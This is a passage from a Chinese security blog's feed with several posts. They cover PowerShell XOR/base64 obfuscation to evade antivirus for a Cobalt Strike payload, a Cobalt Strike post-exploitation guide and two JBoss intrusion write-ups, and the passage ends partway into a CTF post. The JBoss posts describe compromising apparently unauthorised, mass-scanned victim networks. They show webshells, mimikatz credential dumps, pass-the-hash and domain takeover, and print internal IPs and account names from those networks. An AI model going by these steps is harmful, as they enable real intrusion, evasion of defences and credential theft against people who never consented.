class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">"RcoIl"</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Ascii.GetBytes(<span class="variable">$str</span>)</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$bytes</span>.count; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$bytes</span>[<span class="variable">$i</span>] = <span class="variable">$bytes</span>[<span class="variable">$i</span>] -bxor <span class="number">0</span>x98 <span class="comment"># 异或</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$encode</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)  <span class="comment"># 加密</span></span><br><span class="line"><span class="variable">$encode</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> =[Convert]::FromBase64String(<span class="variable">$encode</span>); <span class="comment">#解密</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$decode</span>.count; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$decode</span>[<span class="variable">$i</span>] = <span class="variable">$decode</span>[<span class="variable">$i</span>] -bxor <span class="number">0</span>x98 <span class="comment"># 异或</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$byte</span> = [System.Text.Encoding]::Ascii.GetString(<span class="variable">$decode</span>)</span><br><span class="line"><span class="variable">$byte</span>.Substring(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">PS C:\Users\allen\Desktop&gt; .\demo.ps1</span><br><span class="line">ypj7mPeY0Zj0mA==</span><br><span class="line">RcoIl</span><br></pre></td></tr></table></figure></p><h2 id="0x02-免杀效果"><a href="#0x02-免杀效果" class="headerlink" title="0x02 免杀效果"></a>0x02 免杀效果</h2><p>payload选择的是Cobalt Strike 3.8生成的payload.ps1<br>编译生成exe.<br><img src="/image/PowerShell免杀（一）/blog_2018-04-11_15-52-59.png" alt=""><br>当然，在实际测试过程中并没有那么完美，至少没能绕过avp的行为查杀。</p><p>【参考】</p><p><a href="https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2" target="_blank" rel="noopener">https://www.peew.pw/blog/2017/12/4/writing-net-executables-for-penteters-part-2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看免杀&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="PowerShell" scheme="https://rcoil.me/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike上手学习</title>
    <link href="https://rcoil.me/2018/04/Cobalt%20Strike%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rcoil.me/2018/04/Cobalt Strike学习/</id>
    <published>2018-04-07T05:21:16.000Z</published>
    <updated>2018-04-09T00:52:01.337Z</updated>
    
    <content type="html"><![CDATA[<p>Cobalt Strike是一款非常优秀的后渗透平台，基于Java。</p><a id="more"></a><p>日常的Cobalt Strike学习，Cobalt Strike提供的UI界面，使得很多操作都很容易理解，所以使得很多操作变得更加的简单。</p><h2 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h2><font color="#0099ff" size="3" face="黑体">beacon</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">是Cobalt Strike内嵌的监听器，也就是说，当在目标系统成功执行payload后，</span><br><span class="line">会弹会一个beacon的shell给Cobalt Strike，</span><br><span class="line">该shell所支持的通信协议主要包括dns、https、http、smp[pipe]。</span><br></pre></td></tr></table></figure><p>实战中尽可能使用dns，或者，不用IP而使用域名。</p><font color="#0099ff" size="3" face="黑体">foreign</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">提供给外部使用的一些监听器，</span><br><span class="line">比如你想利用Cobalt Strike派生一个Meterpreter的shell进行内网渗透，</span><br><span class="line">这就需要用到foreign。</span><br></pre></td></tr></table></figure><h2 id="使用powershell"><a href="#使用powershell" class="headerlink" title="使用powershell"></a>使用powershell</h2><p>第一种方式：在beacon shell中导入外部ps脚本到远程机器上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell-import /root/Desktop/PowerView.ps1</span><br><span class="line">powershell Get-NetGroup -GroupName *admin*</span><br></pre></td></tr></table></figure><p>第二种方式：在beacon shell中直接执行powershell代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powerpick Get-NetGroup</span><br></pre></td></tr></table></figure><p><img src="/image/Cobalt Strike学习/powerpick.png" alt=""></p><h2 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h2><p>为了让CS和msf互相间联通使用，在目标机器上开启socks4a代理。</p><p>[<strong>Beacon</strong>]–&gt;[<strong>Pivoting</strong>]–&gt;[<strong>SOCKS Server</strong>] 或者直接在beacon中执行<code>socks post</code></p><p><img src="/image/Cobalt Strike学习/socks-start.png" alt=""></p><p>第一种利用方式：利用各种socks代理客户端直接把各类渗透工具带进目标进网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/proxychains.conf</span><br><span class="line">socks4 lhost 2333</span><br><span class="line"># proxychains msfconsole</span><br></pre></td></tr></table></figure><p>第二种利用方式：直接利用隧道把整个msf带进目标内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole</span><br><span class="line">setg Proxies socks4:lhost:2333</span><br></pre></td></tr></table></figure><p><img src="/image/Cobalt Strike学习/socks-setg.png" alt=""></p><h2 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h2><p><img src="/image/Cobalt Strike学习/socks-ssh.png" alt=""></p><p>使用<code>upload</code>和<code>download</code>进行上传下载。也可以通过socks代理进行登陆。</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>[<strong>Beacon</strong>]–&gt;[<strong>access</strong>]–&gt;[<strong>Elevate</strong>]</p><p><img src="/image/Cobalt Strike学习/权限提升-elevate.png" alt=""></p><p>Cobalt Strike 内嵌了两个提权exp，<code>ms14-058</code>是个老提权漏洞利用方式，可利用于<code>Windows 7</code>系统。</p><p><code>uac-dll</code>是一种Bypass UAC攻击，是由本地管理员运行payload从中等权限往最高权限提升的过程，适用于<code>windows 7</code>和<code>windows 10</code>。</p><p>可以通过导入cna文件进行丰富漏洞库。项目地址为：<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener"><strong>ElevateKit</strong></a></p><p><img src="/image/Cobalt Strike学习/权限提升-elevate-kit.png" alt=""></p><h2 id="Spawn"><a href="#Spawn" class="headerlink" title="Spawn"></a>Spawn</h2><p>可使用spawn功能孵化出n个shell，shell与shell之间相当于以一种级联的形式存在。</p><p><strong>作用：</strong>将公网某团队服务器的beacon shell 派生到本地团队服务器指定的监听器上，或是派生到msf。</p><font color="#0099ff" size="3" face="黑体">派生至本地团队服务器</font><p><img src="/image/Cobalt Strike学习/spawn-local.png" alt=""></p><p>建立好监听器，返回到左边的公网团队服务器使用spawn功能，选择刚刚建立的监听器。</p><p><img src="/image/Cobalt Strike学习/spawn-listener.png" alt=""></p><p>过一会儿就能看到shell被正常弹到本地团队服务器指定的监听器上。</p><font color="#0099ff" size="3" face="黑体">派生至Meterpreter</font><p>在公网团队服务器上创建一个外部foreign监听器（本地msf与CS使用的协议无比相同）</p><p><img src="/image/Cobalt Strike学习/spawn-foregn.png" alt=""></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p><img src="/image/Cobalt Strike学习/横向移动-login.png" alt=""></p><p>首先，要决定用哪种方法来横向移动（当前环境需要高度完整的管理员权限才能完成正常操作）。</p><ul><li><p>如果想使用token作用于某个Beacon，那就选中当前会话的Token框，</p></li><li><p>如果想使用证书或哈希来横向移动，就从凭证存储库中选择凭据或填充用户、密码和域等字段，Beacon会将此信息作为需要的令牌。</p></li><li><p>选择用于横向移动的Listener，通常这个会选择使用HTTPS。</p></li><li><p>最后选择Session，这选项只需要选择同个内网机器Session即可（已上线）。</p><p><img src="/image/Cobalt Strike学习/横向移动-login-1.png" alt=""></p></li></ul><p><strong>PS：</strong></p><p>Cobalt Strike的异步进攻模式要求每一次攻击都是以当前一个受损系统（已控）为跳板执行的。如果存在多台已控机器，则优先考虑Windows系统作为跳板机，且利用所有的凭证或哈希，攻击成功则会反馈在Beacon控制台中。</p><p>查看<a href="https://youtu.be/mpsdLuJ-J_U" target="_blank" rel="noopener"><strong>官方操作</strong></a>，与日常操作方式不太一样。</p><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>通过红色区域（指已获取beacon shell的机器）做一个重定向到蓝色区域（没有取得控制权的目标机器）有漏洞的机器。</p><p>查看说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help rportfwd</span><br><span class="line">Use: rportfwd [bind port] [forward host] [forward port]</span><br><span class="line">     rportfwd stop [bind port]</span><br><span class="line"></span><br><span class="line">Binds the specified port on the target host. When a connection comes in,</span><br><span class="line">Cobalt Strike will make a connection to the forwarded host/port and use Beacon</span><br><span class="line">to relay traffic between the two connections.</span><br></pre></td></tr></table></figure><p>第一个参数为监听端口，第二个参数是转发主机和转发端口。<strong>注意：</strong>目标主机都会有防火墙拦截链接（弹框提示）。</p><p>becon  shell 内置了端口转发功能，把本机的某个端口转发到公网（如3389）。</p><p>[<strong>Beacon</strong>]–&gt;[<strong>Pivoting</strong>]–&gt;[<strong>Listener</strong>]</p><p><img src="/image/Cobalt Strike学习/Listener-3389.png" alt=""></p><p>接下来正常链接<code>x.35</code>这台的2333端口即可。</p><font color="#0099ff" size="3" face="黑体">内网机器</font><p>在Beacon shell中建立一条新的监听规则。</p><p><img src="/image/Cobalt Strike学习/Listener-rportfwd.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell netstat -ano | findstr &quot;7878&quot;</span><br><span class="line">[*] Tasked beacon to run: netstat -ano | findstr &quot;7878&quot;</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">  TCP    0.0.0.0:7878           0.0.0.0:0              LISTENING       3516</span><br></pre></td></tr></table></figure><p>在Cobalt Strike当中新建一个Listener，内容如图所示：</p><p><img src="/image/Cobalt Strike学习/Listener.png" alt=""></p><p>上线的Listener选择新建的<code>rportfwd-listener</code>即可。</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>使用域管理员权限伪造一张黄金票据是最常见的方法。</p><p>制作黄金票据的前提条件：</p><ul><li>想要伪造票据的用户</li><li>为其创建票据的域名</li><li>域的SID（whomai /user）</li><li>域控制器上krbtgt用户的NTLM哈希值</li></ul><p><img src="/image/Cobalt Strike学习/黄金票据.png" alt=""></p><p><strong>PS</strong>：</p><p>首先要使用<code>klist /purge</code>清除缓存的授权票据。</p><h2 id="Malleable-C2"><a href="#Malleable-C2" class="headerlink" title="Malleable-C2"></a>Malleable-C2</h2><p>自从Cobalt Strike更新至3.6版本后，官方给出了一个Malleable-C2，也就是在启动团队服务器（服务端）的时候加载一些配置文件，这是一个非常棒的功能，可以帮助我们伪装流量、SSL加密通讯，达到隐匿的效果，值得一用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/cobaltstrike/</span><br><span class="line">git clone https://github.com/rsmudge/Malleable-C2-Profiles</span><br><span class="line"># 使用方法：./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cobaltstrike.com/support" target="_blank" rel="noopener">Cobalt Strike-help</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Cobalt Strike是一款非常优秀的后渗透平台，基于Java。&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>JBoss引起的内网渗透-3</title>
    <link href="https://rcoil.me/2018/03/JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3/"/>
    <id>https://rcoil.me/2018/03/JBoss引起的内网渗透-3/</id>
    <published>2018-03-25T01:00:03.000Z</published>
    <updated>2018-03-26T11:43:43.465Z</updated>
    
    <content type="html"><![CDATA[<p>待人如知己！！！</p><a id="more"></a><p>首先说明，这个系列的JBoss都是批量获取的，并不是针对某地区某组织而为。</p><p><code>WebShell</code>如同上一篇文章获取，但是这次是直接上传<code>jsp脚本</code>文件，这样更加快捷。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本机用户信息：</span><br><span class="line">%computername% --&gt; SZXzzAO-RxxxSY</span><br><span class="line">ifconfig --&gt; 192.168.140.171 </span><br><span class="line">%os% --&gt; Windows Server 2008 R2 x64</span><br><span class="line">System Model --&gt; VMware Virtual Platform</span><br><span class="line">Statistiques depuis --&gt; 19/03/2018 15:00:18</span><br><span class="line">域情况：</span><br><span class="line">存在域</span><br><span class="line">使用循环ping找出了50+台C段存活主机</span><br></pre></td></tr></table></figure><p>翻阅目录</p><ul><li>从用户目录来看，发现域管登录的痕迹；</li><li>C盘根目录下有<code>metasploit</code>，创建时间为<code>2016-04-19</code>；</li><li>用户<code>support</code>用于黑客行为操作用户（<code>CrackMapExec</code>扫描日志等）；</li><li>在<code>deploy\management</code>存在大量后门文件；</li><li>在<code>$Recycle.Bin</code>存在已删除的恶意exe可执行文件；</li><li>存在<code>Panda Security</code>（熊猫卫士）文件夹</li><li>后门之多无法想象。</li></ul><p><img src="/image/JBoss引起的内网渗透-3/JBoss-desktop.png" alt=""></p><p>进程收集</p><ul><li>存在<code>PSANHost.exe</code>（熊猫卫士）</li><li>大量的<code>cmd.exe</code>、<code>powershell.exe</code>及<code>taskkill.exe</code></li></ul><p>其他</p><ul><li>screenshot –&gt; 锁屏</li></ul><h2 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>上传的<code>远控可执行文件</code>运行无反应；</li><li>执行Desktop下的<code>mimikatz.exe</code>，一执行就消失（杀软？）；</li><li>使用<code>powershell</code>执行mimikatz获取hash，但密码为空（注册表被篡改了？）；</li><li>无法将自添加的用户加入管理员组；</li><li>无法执行<code>net view</code>等命令（net 系列缺失）。</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>生成的马是免杀的（virustotal.com）；</li><li><code>Panda</code>动态查杀<code>mimikatz</code>；</li><li>存在<code>KB2871997</code>补丁（Administrator-500）；</li><li>执行命令无回显估计是因为地区语言的原因。</li></ul><h3 id="突破方法"><a href="#突破方法" class="headerlink" title="突破方法"></a>突破方法</h3><ul><li>生成新的<code>CS马</code>；</li><li>修改注册表；</li><li>使用<code>PsExec</code>进行<code>hash注入</code>；</li><li>对内网使用<code>MS-17-010</code>；</li><li>对内网的Web服务进行渗透。</li></ul><p><img src="/image/JBoss引起的内网渗透-3/JBoss-reg.png" alt=""></p><h2 id="横向拓展"><a href="#横向拓展" class="headerlink" title="横向拓展"></a>横向拓展</h2><h3 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h3><p>反弹个<code>metasploit</code>的shell，利用smb进行主机识别。但是失败，估计是在添加路由的时候出现错误，导致访问不到它的内网段。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS.png" alt=""></p><p>已知条件：</p><ul><li>远控上线；</li><li><code>SZXzzAO-RxxxSY</code>各用户的<code>hash</code>。</li></ul><h3 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h3><p>想要横向，那就得需要知道域控为哪些，域管为哪些，域用户为哪些，内网机器存活为多少。这就关于到内网渗透定位技术问题。</p><p>常规的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user /domain  # 存在数据</span><br><span class="line">net view /domain  # 该列表是空的</span><br><span class="line">net group /domain # 存在数据</span><br><span class="line">net group &quot;domain admins&quot; /domain # 无法找到组名称</span><br><span class="line">net time /domain # 存在数据</span><br><span class="line">net group &quot;domain controllers&quot; /domain # 无法找到组名称</span><br><span class="line">nltest /dclist:ALxxx.lxxxl # 存在数据</span><br></pre></td></tr></table></figure><p>以下内容是以上信息的综合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">域控：</span><br><span class="line">SZXDC01  --&gt; 192.168.140.10</span><br><span class="line">SZXDC02  --&gt; 192.168.140.11</span><br></pre></td></tr></table></figure><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-net-user-domain.png" alt=""></p><p>使用<code>Cobalt Strike</code>的ARP扫描（因为net view使用不了），使得<code>Targets</code>有记录。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-arp.png" alt=""></p><p>接下来就是找域管理员，既然不知道组名称，那就先找组名，过程参考<a href="http://www.mottoin.com/92978.html" target="_blank" rel="noopener">内网渗透测试定位技术总结</a>。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-user-domain.png" alt=""></p><p>完成！</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>用比较典型的<code>hash注入</code>碰一下看看运气怎么样。由于存在<code>KB2871997</code>补丁，所以只能使用<code>administrator用户</code>进行注入。</p><p>登陆情况如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.140.10 # 失败</span><br><span class="line">192.168.140.11 # 失败</span><br><span class="line">192.168.140.14 # 成功</span><br><span class="line">....</span><br><span class="line">192.168.140.57 # 成功</span><br><span class="line">192.168.140.78 # 失败</span><br><span class="line">192.168.140.160 # 成功</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-psh.png" alt=""></p><p>这个过程就是不断的进行<code>hash注入</code>，不断的<code>dump密码</code>，结果就如上图。看<code>Credentials</code>里是否存在域管用户账密。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-mimikatz.png" alt=""></p><p>成功获取到域管的账号密码。进行登陆。</p><p><img src="/image/JBoss引起的内网渗透-3/JBoss-CS-DC1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待人如知己！！！&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>JBoss引起的内网渗透-2</title>
    <link href="https://rcoil.me/2018/03/JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-2/"/>
    <id>https://rcoil.me/2018/03/JBoss引起的内网渗透-2/</id>
    <published>2018-03-14T00:28:58.000Z</published>
    <updated>2018-03-16T04:45:26.612Z</updated>
    
    <content type="html"><![CDATA[<p>待人如知己！！</p><a id="more"></a><p>说明：<br>本文中有个错误的概念验证，在判断域管理员的时候不能这么判断的，是不合理的。主要原因是在实操的时候，刚好能够使用Administrator用户密码登陆域，所以文章中就这么下结论了。这只是一个小概率事件，不成定律。</p><h2 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h2><p>Jboss的反序列化漏洞，接下来看站点信息</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-admin-console.png" alt=""></p><p>正常来说这个<code>admin-console</code>及<code>web-console/</code>都是能正常访问的，就算不能正常访问也不会是<code>404状态</code> ，所以为了搞清楚原因，去翻了其目录，进行对比。发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server\default\deploy  #默认部署war目录</span><br><span class="line">server\web\deploy  # 部署war相对应的编译生成目录</span><br></pre></td></tr></table></figure><p>两个目录中，在<code>\web\deploy\</code>中缺少了<code>admin-console</code>和<code>web-console</code>，所以原因是：管理员在安装了<code>JBoss后</code>，为了安全起见，就在<code>server\web\deploy</code>删除了<code>admin-console.war</code>和<code>web-console.war</code>，所以在部署目录下是存在war包，但是编译目录下是不存在的。</p><p>所以接下来就进行常规的war部署，发现war已经上传上去了，但是访问出现404，所以跑去<code>server\web\deploy</code>查看，发现是没有生成相对应的文件夹，原因暂时未知。</p><p>所以就直接将jsp脚本上传到了<code>jmx-console.war</code>当中，成功获取<code>WebShell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server\default\deploy\jmx-console.war\  # 上传访问失败</span><br><span class="line">server\web\deploy\jmx-console.war\  # 上传访问成功</span><br></pre></td></tr></table></figure><p><img src="/image/JBoss引起的内网渗透-2/jboss-webshell.png" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>接下来又是常规的信息收集</p><p>发现在菜刀里面执行命令，多数都是超时状态，所以还是回到之前的工具进行执行或是上传个命令执行马或是用web访问马。</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-ipconfig-all.png" alt=""></p><p><img src="/image/JBoss引起的内网渗透-2/jboss-net-view.png" alt=""></p><p><img src="/image/JBoss引起的内网渗透-2/jboss-systeminfo.png" alt=""></p><p>进程里面是存在<code>avguard.exe</code>，所以需要做免杀。系统是windows xp-x86。</p><p>在查看环境变量的时候发现是存在<code>powershell</code>的,但是没起作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net user #查看本机用户</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HelpAssistant            </span><br><span class="line">postgres                 saverio                  SUPPORT_388945a0   </span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain  #查看域管理员</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            bckagent                 dbagent                  </span><br><span class="line">faxmaker                 idsmessina               lattuca                  </span><br><span class="line">SpaceGuardSvcAccnt       trovato                  VMwareVDPBackupUser      </span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain  #查看域控制器</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DOMAIN1$                 DOMAIN2$    </span><br><span class="line"></span><br><span class="line">域用户就不列举了，实在有些多</span><br></pre></td></tr></table></figure><p>信息收集到这里，就有些蹊跷，因为本机用户里面，除了<code>Administrator</code>存在于域用户中，其余的账户均不见，所以这里能直接判断<code>Administrator</code>就是域管理员。</p><p>综合以上信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DOMAIN2 - 192.168.20.10 # 域控制器</span><br><span class="line">PROTRIBUTCT -Administrator # 域管理员</span><br><span class="line">avguard.exe # 小红伞杀软</span><br><span class="line">powershell # 不可用</span><br></pre></td></tr></table></figure><h2 id="小小免杀"><a href="#小小免杀" class="headerlink" title="小小免杀"></a>小小免杀</h2><p>续上次的<code>shellter</code>免杀，是过不了小红伞的，所以，这种时候，该储备的东西就起作用了。</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-2.png" alt=""></p><p>生成一个Metasploit的马，去<code>Virustotal</code>做测试免杀，是过了AVG的，所以尝试一波。但是，生成的exe在windows 7下面是能正常执行的，但是到了xp上面就不行了。</p><p>用Veil生成个吧，安装Veil也是个大坑，图就不放了。</p><h2 id="横向内网"><a href="#横向内网" class="headerlink" title="横向内网"></a>横向内网</h2><p>接下来思路就很明确了。将PROTRIBUTCT的密码dump下来，幸运的话整个域就能拿下来了。</p><p><img src="/image/JBoss引起的内网渗透-2/jboss-Cobalt-Strike.png" alt=""></p><p>至此，这个域已经拿下，比上篇难度相对来说要小一些。</p><p>还有一个点，就是在查看域控的时候发现是有两台的，也是一样的登陆方式进行登陆即可。但是在这两台域控执行<code>net view /domain:xxxxx</code>结果都是不一样的，这也许就是两台域控的缘故吧。但是DOMAIN1所在的段只能通过DOMAIN2出来，其他机器做跳板均没数据，或许这是玄学了吧。</p><p>至此，整个测试流程就结束了。整个过程有点顺利，不是我发blog的初衷。</p><p><img src="/image/JBoss引起的内网渗透-2/JBoss引起的内网渗透-2.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;待人如知己！！&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>P牛的红包口令</title>
    <link href="https://rcoil.me/2018/02/P%E7%89%9B%E7%9A%84%E7%BA%A2%E5%8C%85%E5%8F%A3%E4%BB%A4/"/>
    <id>https://rcoil.me/2018/02/P牛的红包口令/</id>
    <published>2018-02-18T01:26:22.000Z</published>
    <updated>2018-02-24T18:35:44.142Z</updated>
    
    <content type="html"><![CDATA[<p>这个口令红包没领成。</p><a id="more"></a><p>新年新气象，逛圈子偶遇到P牛发的一个红包。</p><p>题目如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018.mhz.pw:62231</span><br></pre></td></tr></table></figure><h2 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h2><p>使用浏览器访问题目，发现无法访问，且提示为<code>ERR_INVALID_HTTP_RESPONSE</code>，那就说明这个端口并不是<code>HTTP协议</code>的服务。</p><p>使用端口指纹识别：</p><p><img src="/image/P牛的红包口令/nmap.png" alt="nmap"></p><p><code>rsync</code>是linux系统下的数据镜像备份工具。所以我们得去了解一下<code>rsync</code>的基本语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://2018.mhz.pw:62231</span><br><span class="line">从远程rsync服务器中拷贝文件到本地机。如：rsync -av rsync://2018.mhz.pw:62231/www /databack</span><br></pre></td></tr></table></figure><h2 id="源码拉取"><a href="#源码拉取" class="headerlink" title="源码拉取"></a>源码拉取</h2><p><img src="/image/P牛的红包口令/rsync.png" alt="rsync"></p><p>将<code>git</code>裸仓库进行还原</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone pwnhub_6670.git/</span><br></pre></td></tr></table></figure><p><img src="/image/P牛的红包口令/git.png" alt="git"></p><p>需要审计的源码还原成功，但是本地搭建没成功，得修改修改（环境问题）。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>文件列表如下：</p><p><img src="/image/P牛的红包口令/pwnhub.png" alt="pwnhub"></p><p>初略看了下，只有一个登录框。</p><p>那还是读源码吧。从<code>index.php</code>    